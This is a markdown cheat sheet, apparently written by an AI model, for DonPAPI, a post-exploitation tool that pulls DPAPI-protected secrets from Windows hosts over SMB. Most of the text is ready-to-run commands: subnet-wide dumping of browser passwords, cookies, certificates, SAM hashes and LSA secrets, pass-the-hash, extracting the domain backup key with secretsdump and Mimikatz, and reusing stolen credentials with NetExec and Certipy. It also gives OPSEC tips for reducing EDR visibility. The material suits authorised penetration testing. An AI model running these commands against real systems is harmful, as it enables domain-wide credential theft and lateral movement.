# DonPAPI

**Tags:** `#donpapi` `#dpapi` `#credentialdumping` `#remote` `#linux` `#postexploitation` `#windows` `#browsers` `#certificates`

Remote DPAPI pillaging from Linux — the SharpDPAPI equivalent that runs entirely from your Kali box. Connects over SMB/WMI to remotely collect and decrypt DPAPI-protected secrets: Chrome/Edge saved passwords and cookies, Windows Credential Manager, certificates, WiFi passwords, and more. No binary execution on the target.

**Source:** https://github.com/login-securite/DonPAPI
**Install:**
```bash
pip install donpapi
# or
git clone https://github.com/login-securite/DonPAPI && pip install -r requirements.txt
```

```bash
# Full dump — all DPAPI-protected secrets
DonPAPI collect --dc-ip <dc-ip> -d DOMAIN -u Administrator -p Password -t 192.168.1.10
```

> [!note] **DonPAPI vs SharpDPAPI** — SharpDPAPI runs on the target (Windows binary). DonPAPI runs from Kali over SMB — no binary touches the target. Use DonPAPI when you have valid credentials/hash and want to pillage DPAPI secrets without any execution on the target host.

---

## Basic Usage

```bash
# Password auth — single target
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password -t 192.168.1.10

# Pass the Hash
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -H :NTLMhash -t 192.168.1.10

# Multiple targets
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password -t 192.168.1.10,192.168.1.20

# Target from file
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password --targets-file hosts.txt

# Subnet
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password -t 192.168.1.0/24
```

---

## What Gets Dumped

DonPAPI targets the following DPAPI-protected sources:

| Source | What's Recovered |
|---|---|
| Chrome / Edge | Saved passwords, cookies |
| Firefox | Saved passwords (non-DPAPI but included) |
| Windows Credential Manager | Stored domain creds, RDP passwords |
| Certificates | User + machine certificates with private keys |
| WiFi profiles | PSK for all saved wireless networks |
| Windows Vault | App-specific stored credentials |
| DPAPI master keys | Raw keys (for offline decryption) |
| SAM hashes | Local account NTLM hashes |
| LSA secrets | Service account passwords, cached creds |

---

## Targeted Collection

```bash
# Only browser credentials
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --browsers

# Only certificates
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --certificates

# Only WiFi passwords
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --wifi

# Only Credential Manager
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --credentials

# Only SAM + LSA (no DPAPI)
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.1.10 --sam --lsa
```

---

## Output

DonPAPI stores results in a local SQLite database (`DonPAPI.db`) and prints findings to console.

```bash
# Results are written to DonPAPI.db in the current directory
# View with sqlite3 or the built-in reporting

# List collected results from DB
DonPAPI show

# Show credentials only
DonPAPI show --credentials

# Show browser passwords
DonPAPI show --browsers

# Export to text
DonPAPI show > donpapi_results.txt

# Browse DB directly
sqlite3 DonPAPI.db
sqlite> .tables
sqlite> SELECT target, username, password FROM credentials;
sqlite> SELECT url, username, password FROM browser_passwords;
```

---

## Using the Domain Backup Key

If you have the domain DPAPI backup key, DonPAPI can decrypt everything without needing each user's password:

```bash
# Get domain backup key first (requires DA)
# Via secretsdump:
secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local | grep -i "dpapi"

# Via Mimikatz on DC:
# lsadump::backupkeys /export  → produces ntbackup.pvk

# Run DonPAPI with the backup key
DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u Administrator -p Password \
  -t 192.168.1.0/24 --pvk domain_backup.pvk
```

---

## Through a Proxy

```bash
# Proxychains
proxychains DonPAPI collect --dc-ip 192.168.1.1 -d DOMAIN -u user -p Password -t 192.168.10.5
```

---

## Common Post-Collection Actions

```bash
# Extract Chrome passwords for credential spraying
sqlite3 DonPAPI.db "SELECT username, password FROM browser_passwords WHERE browser='chrome';" | \
  awk -F'|' '{print $1":"$2}' > chrome_creds.txt

# Extract all plaintext passwords found
sqlite3 DonPAPI.db "SELECT username, password FROM credentials WHERE password IS NOT NULL;" | \
  awk -F'|' '{print $1":"$2}' > plaintexts.txt

# Test found credentials with NetExec
netexec smb 192.168.1.0/24 -u user -p plaintexts.txt --continue-on-success

# Certificates — export and use with Certipy for ADCS abuse
# DonPAPI exports .pfx files to local directory
certipy auth -pfx exported_cert.pfx -dc-ip 192.168.1.1
```

---

## OPSEC Notes

- DonPAPI uses SMB to read remote files (credential blobs, master key files) — generates file access events (Event ID 4663 if object auditing enabled)
- Authentication events (4624/4648) generated on every target
- No binary execution on the target — significantly lower EDR visibility than SharpDPAPI
- Chrome `Login Data` file may be locked if browser is open on the target — DonPAPI handles this via VSS where available
- Subnet sweeps generate significant SMB traffic — use targeted single-host runs when OPSEC matters

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
